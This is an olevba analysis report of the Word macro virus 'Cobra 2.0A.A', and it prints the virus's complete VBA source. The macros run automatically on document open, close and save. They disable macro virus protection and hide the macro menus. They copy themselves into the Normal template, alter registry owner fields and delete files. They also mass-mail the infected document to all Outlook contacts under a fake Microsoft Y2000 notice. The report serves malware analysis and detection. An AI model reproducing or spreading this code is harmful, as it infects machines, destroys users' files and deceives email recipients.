olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.o-24502a81c72093b83e151a29eb67e079a428cadb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.o-24502a81c72093b83e151a29eb67e079a428cadb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra_20A_A.bas 
in file: Virus.MSWord.Cobra.o-24502a81c72093b83e151a29eb67e079a428cadb - OLE stream: 'Macros/VBA/Cobra_20A_A'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0A.A
Public Const TA = "Cobra"
Public Const TK = "List"
Sub RegEdit()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") <> "LITON VS Cobra" Or _
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") <> "349,(PA12A19H2AG)/DHK/BD" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "LITON VS Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "349,(PA12A19H2AG)/DHK/BD"
End If
For Each doc In Documents
Call WriteReg(doc.FullName)
Next
End Sub
Sub WriteReg(OpenDoc)
On Error Resume Next
Dim X As Integer
Dim SF As String, SK As String
For X = 500 To 1 Step -1
SK = "Doc" & X: SF = GetSetting(TA, TK, SK)
If SF <> "" Then: SK = "Doc" & (X + 1): SaveSetting TA, TK, SK, SF
Next X
SaveSetting TA, TK, "Doc1", OpenDoc
End Sub
Sub GetReg()
On Error Resume Next
Dim i As Integer
Dim vF As Variant
vF = GetAllSettings(TA, TK)
Num = 0
For i = 0 To UBound(vF, 1): Num = Num + 1: Next i
If Num > 15 Then
Num = 0
For i = 0 To UBound(vF, 1)
Num = Num + 1
If Num < 10 Then
Kill vF(i, 1)
End If
DeleteSetting TA, TK, "Doc" & (i + 1)
Next i
End If
End Sub
Sub AutoOpen()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Call MacCopy: Call RegEdit: Call GetReg
End Sub
Sub SendMail()
On Error Resume Next
Dim udoC, dmnC, buosC
Set udoC = CreateObject("Outlook.Application")
Set dmnC = udoC.GetNameSpace("MAPI")
dmnC.Logon "profile", "password"
For lC = 1 To dmnC.AddressLists.Count
Set abC = dmnC.AddressLists(lC)
iC = 1
Set buosC = udoC.CreateItem(0)
For tC = 1 To abC.AddressEntries.Count
oC = abC.AddressEntries(iC)
buosC.Recipients.Add oC
iC = iC + 1
Next tC
buosC.Subject = "Important message about Y2000 from Microsoft Corp. via  " _
& Application.UserName
buosC.Body = "Important documment;-"
buosC.Attachments.Add ActiveDocument.FullName
buosC.Send
oC = ""
Next lC
dmn.LogOff
End Sub
Sub AutoClose()
Call MacCopy: Call RegEdit: Call GetReg: Call SendMail
End Sub
Sub MacCopy()
On Error Resume Next
Set AD = ActiveDocument
Set NT = NormalTemplate
ac = False: nc = False
For i = 1 To NT.VBProject.VBComponents.Count
If NT.VBProject.VBComponents(i).Name <> "ThisDocument" And _
NT.VBProject.VBComponents(i).Name <> "Cobra_20A_A" Then
Application.OrganizerDelete Source:=NT.FullName, _
Name:=NT.VBProject.VBComponents(i).Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For i = 1 To AD.VBProject.VBComponents.Count
If AD.VBProject.VBComponents(i).Name <> "ThisDocument" And _
AD.VBProject.VBComponents(i).Name <> "Reference to Normal" And _
AD.VBProject.VBComponents(i).Name <> "Cobra_20A_A" Then
Application.OrganizerDelete Source:=AD.FullName, _
Name:=AD.VBProject.VBComponents(i).Name, _
Object:=wdOrganizerObjectProjectItems
End If
Next
For i = 1 To AD.VBProject.VBComponents.Count
If AD.VBProject.VBComponents(i).Name = "Cobra_20A_A" Then
ac = True
End If
Next
For i = 1 To NT.VBProject.VBComponents.Count
If NT.VBProject.VBComponents(i).Name = "Cobra_20A_A" Then
nc = True
End If
Next
If ac = True And nc = False Then
Application.OrganizerCopy Source:=AD.FullName, _
Destination:=NT.FullName, Name:="Cobra_20A_A", _
Object:=wdOrganizerObjectProjectItems
End If
If ac = False And nc = True Then
Application.OrganizerCopy Source:=NT.FullName, _
Destination:=AD.FullName, Name:="Cobra_20A_A", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub FileNew()
Call MacCopy: Call RegEdit: Call GetReg: Call SendMail
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call MacCopy: Call RegEdit: Call GetReg: Call SendMail
WordBasic.FileExit
End Sub
Sub FileSaveAs()
Call MacCopy: Call RegEdit: Call GetReg: Call SendMail
Dialogs(wdDialogFileSaveAs).Show
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |.+-                 |List                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

